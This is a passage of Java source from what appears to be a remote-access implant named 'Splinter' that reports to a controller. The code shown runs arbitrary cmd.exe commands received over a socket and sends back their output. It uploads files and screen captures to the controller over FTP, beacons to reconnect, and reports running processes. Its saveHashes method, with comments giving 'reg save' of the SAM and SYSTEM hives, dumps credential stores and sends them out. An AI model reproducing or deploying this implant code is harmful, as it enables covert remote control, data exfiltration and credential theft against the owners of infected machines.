				if(alToSend.get(i) == null || !alToSend.get(i).exists() || !alToSend.get(i).isFile() || alToSend.size() < 1)
				{
					Driver.sop("Empty file received at index " + i + "... skipping this result");
					continue;
				}
				
				FTP_Thread_Sender[] arrFTP_Sender = new FTP_Thread_Sender[alToSend.size()];
				arrFTP_Sender[i] = new FTP_Thread_Sender(true, false, cmd[3], Integer.parseInt(cmd[4]), FTP_ServerSocket.maxFileReadSize_Bytes, alToSend.get(i), pwOut, true, FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES, statusIncrement);
				arrFTP_Sender[i].start();
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendScreenCaptures", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean sendFile(String []command)
	{
		try
		{
			//Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SEND_FILE_TO_CONTROLLER + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT + Driver.delimeter_1 + arr[1];
			
			//[0] == [SPLINTER_IMPLANT]
			//[1] == SEND_FILE
			//[2] == ADDRESS
			//[3] == PORT
			//[4] == ABSOLUTE PATH TO FILE
			
			FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, command[2], Integer.parseInt(command[3]), FTP_ServerSocket.maxFileReadSize_Bytes, new File(command[4]), pwOut, false, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
			FTP_Sender.start();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendFile", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return true;
	}
	
	public boolean omitCommand(String cmd)
	{
		try
		{
			if(cmd == null)
			{
				return false;
			}
			
			//
			//Check if command starts with or contains shortcut commands that we do not wish to execute on the command terminal
			//
			if(cmd.trim().toUpperCase().startsWith(Driver.CHAT_MESSAGE_BROADCAST.trim().toUpperCase()))
			{
				Driver.sop("\n * * SPECIAL NOTE: ommitting executing command CHAT MESSAGE * * ");
				return true;
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("omitCommand", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean executeCommand(String command)
	{
		try
		{//need to catch for tftp all exe's and use /K option!!!!!!
			//ok, so need to know when to use the /K option
			//Also need to trap for the cd and save those directories, and also return an echo back to the client!
			
			//Driver.sop("1 - in " + strMyClassName + " received command: " + command);
			
			//
			//ENSURE WE'RE NOT TRYING TO EXECUTE SHORTCUT COMMANDS
			//
			if(omitCommand(command))
			{				
				return true;
			}
			
			
			boolean skipReadingOutputStreams = false;
			if(command != null && command.startsWith(Splinter_IMPLANT.OMIT_READING_OUTPUT_STREAMS_UPON_COMMAND_EXECUTION))
			{
				//this is only meant when trying to launch standalone programs and we wish for the implant to continue listening immediately
				//if we're read
				
				//thus, do not wait on reading the stdOut and stdErr
				skipReadingOutputStreams = true;
				
				//remove the special chars
				command = command.substring(Splinter_IMPLANT.OMIT_READING_OUTPUT_STREAMS_UPON_COMMAND_EXECUTION.length());
												
				String result = ""; 
				
				if(skipReadingOutputStreams)
				{
					result = ">> command executed. output omitted";//omitted
					
					//simply execute what the user typed and do not read the out from the process!!!  this will prevent hanging
					process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
					
					//note!!!! we still have to clear the process buffer, otherwise the system will return "ERROR: Not enough storage is available to complete this operation." <---- this is because all data is consumed since the process buffer is still full.  so to get around this, we will simply call the processhandlers to drain the process buffers
					
					process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
					process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
					//process_OUT = new PrintWriter(new OutputStreamWriter(process.getOutputStream()));	//not going to open an output writer to interact with the process at this time!
					
					/*
					 * NOTE: Executing a process in java using the process = Runtime.getRuntime().exec()
					 * 
					 * initiates a process to carry out the command, however data is returned in 2 seperate streams:
					 * 	one stream for the process itself and the data returned, 
					 *  and the other stream for the error stream to return error commands from executing the process
					 * 
					 * A problem occurs when you try to execute a command that may fail at times because it is not always
					 * certain which will occur first, if the error stream will be filled, or if the process stream will 
					 * be filled.  Next, some processes may return a large amount of data and the buffer must be cleared first
					 * before more data can be entered.  To solve these problems, we instantiate 2 threads to read the 
					 * input streams on the same process, and flush the contents back across the output stream we specify
					 * (in this case, the socket output stream)
					 * 
					 * Therefore, with threads, we can handle the concurrent consummation of data in the process's 
					 * output stream as well as data in the process's error output stream
					 * 
					 * I created the ProcessHandlerThread class to handle this overhead.
					 * 
					 *  Soon, I'll create a "Process" java package that does all of these calls for the user, 
					 *  so all you'll have to do is instantiate my main caller class, and the command will be carried out
					 * 
					 * 
					 */
					
					ProcessHandlerThread process_INPUT = new ProcessHandlerThread(command, process, process_IN, null);
					ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(command, process, process_IN_ERROR, null); 
					
					process_INPUT.start();
					process_INPUT_ERROR.start();
					
				}
				
				/*else//execute as before, read out streams
				{
					process_IN = new BufferedReader(new InputStreamReader(process.getErrorStream()));
					
					result = process_IN.readLine();
					
					if(result == null || result.trim().equals(""))
					{
						result = "command completed successfully. no errors reported.";
					}//otherwise, datais loaded in result, return it to the user					
					
				}*/				
				
				pwOut.println(result);				 
		    	pwOut.flush(); 
		    	executeCommand(" ");													
				
		    	System.gc();
				
				
				return true;
			}
			
			/**************************************************
			 * 
			 * PRINT CURRENT WORKING DIRECTORY
			 * 
			 *************************************************/
			
			if(command != null && command.trim().equals(""))
			{
				//echo out to the user
				//process = Runtime.getRuntime().exec("cmd /c echo " + this.CURRENT_WORKING_DIRECTORY);
				
				process = Runtime.getRuntime().exec("cmd /c cd ", null, Driver.fleCurrentWorkingDirectory); 
				
				//open a new stream on the new process
				process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
			    process_OUT = new PrintWriter(new OutputStreamWriter(process.getOutputStream()));		      
			      
			    //return what was just executed to the print writer buffer
			    
			    //we have started a proc, now send everything returned from that proc across the pw to the telnet terminal
			    String cmdLine = "";
			    while ((cmdLine = process_IN.readLine()) != null) 
			    {
			    	//Driver.sop("2 - in " + strMyClassName + " sending command: " + cmdLine);
			    	pwOut.println(cmdLine + ">"); 
			    	pwOut.flush(); /*System.out.println(cmdLine);*/
			    }			    
			    
			}
			
			/**************************************************
			 * 
			 * START COMMAND
			 * 
			 *************************************************/
			
			//check if user selected the command "start" because if so, we will execute this without reading the the output on the command!
			else if(command.trim().toLowerCase().startsWith("start"))
			{
				//simply execute what the user typed and do not read the out from the process!!!  this will prevent hanging
				process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
				
				String result = ">> command executed. output omitted";//ommitted 
				
				if(skipReadingOutputStreams)
				{
					
				}
				else//execute as before, read out streams
				{
					process_IN = new BufferedReader(new InputStreamReader(process.getErrorStream()));
					
					result = process_IN.readLine();
					
					if(result == null || result.trim().equals(""))
					{
						result = "command completed successfully. no errors reported.";
					}//otherwise, datais loaded in result, return it to the user
					
					
				}
				
				
				pwOut.println(result);
				//pwOut.println("* * start command sent to terminal."); 
		    	pwOut.flush(); /*System.out.println(cmdLine);*/
		    	executeCommand(" ");													
				
		    	System.gc();
			}
			
			//check if user is changing directory letters, e.g. "b:"
			else if(command.trim().length() == 2)
			{
				File newDrive = new File(command.trim());
				
				//GEEZ!!!!!!!!!!!!!!  this must be a "JAVA'ism" changing directory to f: works just fine, but c: returns an error, thus, if we want to get to drive c, insert "\" for the root
				if(command.trim().equalsIgnoreCase("c:"))
				{
					newDrive = new File(Driver.fileSeperator);
				}
				
				//try to execute the directory. if successful, save it, otherwise, throw exceptoin
				try
				{
					process = Runtime.getRuntime().exec("cmd /c cd", null, newDrive);
					
					
					//open a new stream on the new process
					process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
				    process_OUT = new PrintWriter(new OutputStreamWriter(process.getOutputStream()));		      
				    			    				    
				    //we have started a proc, now send everything returned from that proc across the pw to the telnet terminal
				    String cmdLine = "";
				    while ((cmdLine = process_IN.readLine()) != null) 
				    {
				    	pwOut.println(cmdLine + ">"); pwOut.flush(); /*System.out.println(cmdLine);*/				    	
				    }	
				    
				    
				    //we made it here without error, save the new directory!
				    Driver.fleCurrentWorkingDirectory = newDrive;
				    Driver.CURRENT_WORKING_DIRECTORY = newDrive.toString();
				}
				catch(Exception ee)//invalid drive directory specified
				{
					//An exception is thrown on invalid file is passed to change directories!
					pwOut.println("The system cannot find the drive specified!"); 
					pwOut.println(Driver.fleCurrentWorkingDirectory.getCanonicalFile() + ">");
					pwOut.flush(); 
				}
												
				//executeCommand(" ");		
				return true;
			}
			
			else if(command != null && command.trim().startsWith("cd"))
			{
				try
				{
					File newDirectory = null;
					
					//check for specific cd\ or cd \
					if(command.trim().equalsIgnoreCase("cd\\") || command.trim().equalsIgnoreCase("cd \\"))
					{
						newDirectory = new File("\\");//just start at the root directory!
					}
					//GEEZ!!!!!!!!!!!!!!  this must be a "JAVA'ism" changing directory to f: works just fine, but c: returns an error, thus, if we want to get to drive c, insert "\" for the root
					else if(command.trim().equalsIgnoreCase("cd c:"))
					{
						newDirectory = new File(Driver.fileSeperator);
					}
					
					else
					{										
						//next, need to determine if the user typed something like cd c:\\users  (i.e. start from a new directory) or continue from the current directory
												
						//need to track changes in the working directory!
						String normalizedCommand = command.trim();
						normalizedCommand = command.substring(2);
						normalizedCommand = normalizedCommand.trim();//attempt to set a file
						
						
						//ok so here, check if we're starting from a new directory, i.e. "cd c:"
						//if so, execute just like we did above with length == 2
						if(normalizedCommand.length() == 2 && !normalizedCommand.startsWith(".."))
						{
							//POSSIBLE BUFFER OVERFLOW HERE TOO!
							newDirectory = new File(normalizedCommand);
						}
						else//the user wants to execute a directory change from the current directory. so use the previous working directory
						{
							//one more check, make sure we do not get something like \\<new directory> in case user chose to go to drive c:
							//see above, for some reason, java prevents us from executing cd c: directly, so instead, we replace cd c: with a new file("\")
							
							if(Driver.fleCurrentWorkingDirectory.toString().endsWith(Driver.fileSeperator))
								newDirectory = new File(Driver.fleCurrentWorkingDirectory + normalizedCommand);
							
							else //add the separator
								newDirectory = new File(Driver.fleCurrentWorkingDirectory + Driver.fileSeperator + normalizedCommand);
						}						
												
										
						//attempt to execute, and if we were successful, then set CURRENT_WORKING_DIRECTORY to this new file address and set this.fleCurrentWorkingDirectory to the new file
						//Otherwise, there was an error on the comman, so do not replace the current working file
						
					}
					
					process = Runtime.getRuntime().exec("cmd /c cd", null, newDirectory);
					
					
					//open a new stream on the new process
					process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
				    process_OUT = new PrintWriter(new OutputStreamWriter(process.getOutputStream()));		      
				      
				    //return what was just executed to the print writer buffer
				    
				    //we have started a proc, now send everything returned from that proc across the pw to the telnet terminal
				    String cmdLine = "";
				    while ((cmdLine = process_IN.readLine()) != null) 
				    {
				    	pwOut.println(cmdLine + ">"); pwOut.flush(); /*System.out.println(cmdLine);*/				    	
				    }	
									    
				    //we made it here, thus the file should have been a good one, save it accordingly
				    Driver.fleCurrentWorkingDirectory = newDirectory;
				    Driver.CURRENT_WORKING_DIRECTORY = newDirectory.getCanonicalPath();
				    				    
				}
				catch(Exception e)
				{
					//An exception is thrown on invalid file is passed to change directories!
					pwOut.println("The system cannot find the drive specified!"); 
					pwOut.println(Driver.fleCurrentWorkingDirectory.getCanonicalFile() + ">");
					pwOut.flush(); 
				}
				
			}
			
			/*else if(command != null && command.trim().startsWith("cd"))
			{
				//execute the command, it it worked ok, store the response!
				
				process = Runtime.getRuntime().exec("cmd.exe /C " + command);
				process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
				process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
				//process_OUT = new PrintWriter(new OutputStreamWriter(process.getOutputStream()));	//not going to open an output writer to interact with the process at this time!
				
				/*
				 * NOTE: Executing a process in java using the process = Runtime.getRuntime().exec()
				 * 
				 * initiates a process to carry out the command, however data is returned in 2 seperate streams:
				 * 	one stream for the process itself and the data returned, 
				 *  and the other stream for the error stream to return error commands from executing the process
				 * 
				 * A problem occurs when you try to execute a command that may fail at times because it is not always
				 * certain which will occur first, if the error stream will be filled, or if the process stream will 
				 * be filled.  Next, some processes may return a large amount of data and the buffer must be cleared first
				 * before more data can be entered.  To solve these problems, we instantiate 2 threads to read the 
				 * input streams on the same process, and flush the contents back across the output stream we specify
				 * (in this case, the socket output stream)
				 * 
				 * Therefore, with threads, we can handle the concurrent consummation of data in the process's 
				 * output stream as well as data in the process's error output stream
				 * 
				 * I created the ProcessHandlerThread class to handle this overhead.
				 * 
				 *  Soon, I'll create a "Process" java package that does all of these calls for the user, 
				 *  so all you'll have to do is instantiate my main caller class, and the command will be carried out
				 * 
				 * 
				 */
				
	/*			ProcessHandlerThread process_INPUT = new ProcessHandlerThread( process, process_IN, pwOut);
				ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(process, process_IN_ERROR, pwOut); 
				
				process_INPUT.start();
				process_INPUT_ERROR.start();
				
				//check if we change the current working directory
				//here, the user typed "cd..." so if there was not an error, update our working directory!
				
				
				/*int val = process.waitFor();
				
				process_INPUT.join();
				process_INPUT_ERROR.join();*/
				
				//Finished executing at this point, display the working directory back to user so they know we're finished
	/*			executeCommand(" ");				
				
			}*/
			
			else
			{
			
				
				//process = Runtime.getRuntime().exec("cmd.exe /C " + command);
				process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
				process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
				process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
				//process_OUT = new PrintWriter(new OutputStreamWriter(process.getOutputStream()));	//not going to open an output writer to interact with the process at this time!
				
				/*
				 * NOTE: Executing a process in java using the process = Runtime.getRuntime().exec()
				 * 
				 * initiates a process to carry out the command, however data is returned in 2 seperate streams:
				 * 	one stream for the process itself and the data returned, 
				 *  and the other stream for the error stream to return error commands from executing the process
				 * 
				 * A problem occurs when you try to execute a command that may fail at times because it is not always
				 * certain which will occur first, if the error stream will be filled, or if the process stream will 
				 * be filled.  Next, some processes may return a large amount of data and the buffer must be cleared first
				 * before more data can be entered.  To solve these problems, we instantiate 2 threads to read the 
				 * input streams on the same process, and flush the contents back across the output stream we specify
				 * (in this case, the socket output stream)
				 * 
				 * Therefore, with threads, we can handle the concurrent consummation of data in the process's 
				 * output stream as well as data in the process's error output stream
				 * 
				 * I created the ProcessHandlerThread class to handle this overhead.
				 * 
				 *  Soon, I'll create a "Process" java package that does all of these calls for the user, 
				 *  so all you'll have to do is instantiate my main caller class, and the command will be carried out
				 * 
				 * 
				 */
				
				ProcessHandlerThread process_INPUT = new ProcessHandlerThread(command, process, process_IN, pwOut);
				ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(command, process, process_IN_ERROR, pwOut); 
				
				process_INPUT.start();
				process_INPUT_ERROR.start();
				
				/*int val = process.waitFor();
				
				process_INPUT.join();
				process_INPUT_ERROR.join();*/
				
				//Finished executing at this point, display the working directory back to user so they know we're finished
				executeCommand(" ");				
				
			}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("executeCommand", strMyClassName, e, e.getLocalizedMessage(), true);
		}
		
		return false;
	}
	
	public boolean executeCommand_SaveResultsToFile_AndFTP_Results_To_Controller(String COMMAND, File fleFullPath_including_extension_to_write_command_output, String statusNotification, String FTP_Addr, int FTP_Port, PrintWriter pwSktOut)
	{
		
		PrintWriter pwFileOut = null;
		
		try
		{
			
			//
			//ENSURE WE'RE NOT TRYING TO EXECUTE SHORTCUT COMMANDS
			//
			if(omitCommand(COMMAND))
			{				
				return true;
			}
			
			//Assuming our temp file was created, open a print writer on the file (this will really drop the file on the system, if successful, we'll proceed with the command
			pwFileOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(fleFullPath_including_extension_to_write_command_output.toString())));
			
			
			//Execute command
			Process process = Runtime.getRuntime().exec(COMMAND);			
			
			//note!!!! we still have to clear the process buffer, otherwise the system will return "ERROR: Not enough storage is available to complete this operation." <---- this is because all data is consumed since the process buffer is still full.  so to get around this, we will simply call the processhandlers to drain the process buffers
			
			BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
						
			ProcessHandlerThread process_INPUT = new ProcessHandlerThread(COMMAND, process, process_IN, pwFileOut);
			ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(COMMAND, process, process_IN_ERROR, pwFileOut); 
			
			process_INPUT.start();
			process_INPUT_ERROR.start();
			
			//clean up the system
			System.gc();
			
			pwFileOut.flush();
			pwFileOut.close();
			
			this.sendToController(statusNotification + " Searching for Controller to FTP results...", false, true);
			
			FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Addr, FTP_Port, FTP_ServerSocket.maxFileReadSize_Bytes, fleFullPath_including_extension_to_write_command_output, pwSktOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
			FTP_Sender.start();
			
			
			return true;
		}
		catch(Exception e)
		{
			try{pwFileOut.close();}catch(Exception ee){}
			
			Driver.eop("executeCommand_SaveResultsToFile_AndFTP_Results_To_Controller", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean executeCommand(String COMMAND, PrintWriter pwOutSocket)
	{
		try
		{
			//
			//ENSURE WE'RE NOT TRYING TO EXECUTE SHORTCUT COMMANDS
			//
			if(omitCommand(COMMAND))
			{				
				return true;
			}
			
			//Execute command
			Process process = Runtime.getRuntime().exec(COMMAND);			
			
			//note!!!! we still have to clear the process buffer, otherwise the system will return "ERROR: Not enough storage is available to complete this operation." <---- this is because all data is consumed since the process buffer is still full.  so to get around this, we will simply call the processhandlers to drain the process buffers
			
			BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
						
			ProcessHandlerThread process_INPUT = new ProcessHandlerThread(COMMAND, process, process_IN, pwOutSocket);
			ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(COMMAND, process, process_IN_ERROR, pwOutSocket); 
			
			process_INPUT.start();
			process_INPUT_ERROR.start();
			
			//clean up the system
			System.gc();
			
			pwOutSocket.flush();
			
			//this.sendToController(statusNotification + " Searching for Controller to FTP results...", false, true);
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("executeCommand taking String COMMAND and PrintWriter pwOutSocket as params", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == tmrBeacon && respondToTimerInterrupt)
			{
				//stop timer from further interrupts
				try
				{
					tmrBeacon.stop();					
				}catch(Exception e){}
				
				respondToTimerInterrupt = false;
				
				//re-establish connection!
				startImplant();
			}
			
			else if(ae.getSource() == tmrRunningProcessList && this.processInterrupt_RunningProcessList)
			{
				this.processInterrupt_RunningProcessList = false;
				
				sendRunningProcessList();
				
				this.processInterrupt_RunningProcessList = true;
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	
	public boolean sendRunningProcessList()
	{
		try
		{
			//proceed by calling tasklist command. all inputs will be buffered in an arraylist, and we'll flush the arraylist from here inserting a special preamble to let Splinter Controller know to display this in a special frame
			
			
			//execute the command and get the arraylist from executing the command			
			//proc = Runtime.getRuntime().exec("cmd /c " + "tasklist /v /fo csv"); 
			proc = Runtime.getRuntime().exec("tasklist /v /fo csv");
			brIn_WorkerThread = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			alRunningProcessList = ProcessHandlerThread.getBufferedArrayList(brIn_WorkerThread, true);
			
			//send output back to Controller
			if(alRunningProcessList == null || alRunningProcessList.size() <1)
			{
				sendToController("No process data to return!", false, true);
				try
				{
					Driver.sop("Stopping interrupt timer for running process list");
					this.tmrRunningProcessList.stop();
				}catch(Exception e){}
			}
			
			//otherwise, whew, we have buffered data to return back to the controller
			
			//send the command to clear the current process list data and hide text until we're finished
			this.sendToController(this.myUniqueDelimiter + Driver.delimeter_1 + Driver.BEGIN_RUNNING_PROCESS_LIST,  false,  false);
			
			//SEND ALL BUFFERED DATA
			for(int i = 0; i < this.alRunningProcessList.size(); i++)
			{
				this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.DATA_RUNNING_PROCESS_LIST +  Driver.delimeter_1 + alRunningProcessList.get(i),  false, false);
			}			
			
			//state we're finished sending process data
			this.sendToController(this.myUniqueDelimiter + Driver.delimeter_1 + Driver.END_RUNNING_PROCESS_LIST,  false,  false);
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendRunningProcessList", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
	
	
	public boolean saveHashes(String COMMAND, File fleFullPath_including_extension_to_write_command_output, String statusNotification, String FTP_Addr, int FTP_Port, PrintWriter pwSktOut)
	{					
		try
		{
			
			//reg save HKLM\SAM "C:\Users\ADMINISTRATOR\AppData\Local\Temp\SAM.hive" /y
			//reg save HKLM\SYSTEM "C:\Users\ADMINISTRATOR\AppData\Local\Temp\SYSTEM.hive" /y
			
			//Assuming our temp file was created, open a print writer on the file (this will really drop the file on the system, if successful, we'll proceed with the command
						
			//Execute command
			Process process = Runtime.getRuntime().exec(COMMAND);			
			
			//note!!!! we still have to clear the process buffer, otherwise the system will return "ERROR: Not enough storage is available to complete this operation." <---- this is because all data is consumed since the process buffer is still full.  so to get around this, we will simply call the processhandlers to drain the process buffers
			
			BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
						
			ProcessHandlerThread process_INPUT = new ProcessHandlerThread(COMMAND, process, process_IN, pwSktOut);
			ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(COMMAND, process, process_IN_ERROR, pwSktOut); 
			
			process_INPUT.start();
			process_INPUT_ERROR.start();
			
			//clean up the system
			System.gc();			
		
			
			this.sendToController(statusNotification + " Searching for Controller to FTP results...", false, true);
			
			FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Addr, FTP_Port, FTP_ServerSocket.maxFileReadSize_Bytes, fleFullPath_including_extension_to_write_command_output, pwSktOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
			FTP_Sender.start();
			
			
			return true;
		}
		catch(Exception e)
		{
			//try{pwFileOut.close();}catch(Exception ee){}
			
			Driver.eop("saveHashes", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
	
	
	
	
	
	
	
	
	
}//end implant class